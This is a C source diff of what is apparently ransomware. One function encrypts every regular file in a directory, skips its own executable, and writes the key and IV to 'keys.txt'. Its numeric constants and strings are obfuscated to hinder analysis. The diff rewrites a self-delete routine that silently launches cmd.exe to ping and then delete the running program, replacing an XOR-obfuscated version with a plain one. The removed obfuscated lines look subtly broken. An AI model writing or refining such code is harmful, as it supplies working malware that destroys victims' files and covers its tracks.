@@ -53,17 +53,12 @@ int e(unsigned char *plaintext, int plaintext_len, unsigned char *key,
 void ed(const char* dir_path){struct dirent* entry;unsigned char key[(0x0000000000000040 + 0x0000000000000220 + 0x0000000000000820 - 0x0000000000000A60)];unsigned char iv[(0x0000000000000020 + 0x0000000000000210 + 0x0000000000000810 - 0x0000000000000A30)];DIR* dir=opendir(dir_path);gk(key,sizeof((key)));giv(iv,sizeof((iv)));if (dir == NULL){return ;};while ((entry = readdir(dir)) != NULL){char file_path[(0x0000000000000800 + 0x0000000000000600 + 0x0000000000000C00 - 0x0000000000001600)];snprintf(file_path,sizeof((file_path)),"\x25""s\057%\x73""",dir_path,entry->d_name);struct stat statbuf;if (!(stat(file_path,&statbuf) ^ 0x0000000000000000)){if (S_ISREG(statbuf.st_mode)){char ofilename[(0x0000000000000800 + 0x0000000000000600 + 0x0000000000000C00 - 0x0000000000001600)];char test[(0x0000000000004E1E + 0x000000000000290F + 0x0000000000002F0F - 0x0000000000007F2D)];GetModuleFileName(NULL,test,(0x0000000000004E1E + 0x000000000000290F + 0x0000000000002F0F - 0x0000000000007F2D));if (!(strcmp(gf(test),gf(file_path)) ^ 0x0000000000000000)){continue;};FILE* tfile=fopen(file_path,"\x72""b");strcpy(ofilename,file_path);sign(ofilename);FILE* ofile=fopen(ofilename,"\x77""b");unsigned char buffer[(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00)];unsigned char ct[(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00) + (0x0000000000004E1E + 0x000000000000290F + 0x0000000000002F0F - 0x0000000000007F2D)];int bytes_read;while (((bytes_read = fread(buffer,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((buffer)),tfile)) > (0x0000000000000000 + 0x0000000000000200 + 0x0000000000000800 - 0x0000000000000A00)) & !!((bytes_read = fread(buffer,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((buffer)),tfile)) > (0x0000000000000000 + 0x0000000000000200 + 0x0000000000000800 - 0x0000000000000A00))){int ciphertext_len=e(buffer,bytes_read,key,iv,ct);fwrite(ct,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),ciphertext_len,ofile);};};};};closedir(dir);FILE* important_info=fopen("\x6B""e\171s\x2E""t\170t","\x77""b");fwrite(key,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((key)),important_info);fwrite(iv,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((iv)),important_info);fclose(important_info);};
 
 void sd() {
-    char bC[MAX_PATH], bD[MAX_PATH + 10];
-    GetModuleFileName(NULL, bC, MAX_PATH);
-    int i;
-    for(i = 0; i < MAX_PATH; i++) bC[i] ^= (0xAB ^ 0xCD);
-
-    char *s1 = "cmd.exe /C ping 1.2.3.4 -n 1 -w 3000 > Nul & Del \"%s\"";
-    for(i = 0; s1[i]; i++) s1[i] ^= (0xA3 ^ 0x11);
-
-    sprintf(bD, s1, bC);
-    WinExec(bD, SW_HIDE);
-    exit((0x10 | 0x40) ^ (0x50));
+    char szFilePath[MAX_PATH];
+    char szCmd[MAX_PATH + 10];
+    GetModuleFileName(NULL, szFilePath, MAX_PATH);
+    sprintf(szCmd, "cmd.exe /C ping 1.2.3.4 -n 1 -w 3000 > Nul & Del \"%s\"", szFilePath);
+    WinExec(szCmd, SW_HIDE);
+    exit(EXIT_SUCCESS);
 }
 
 void oc() {
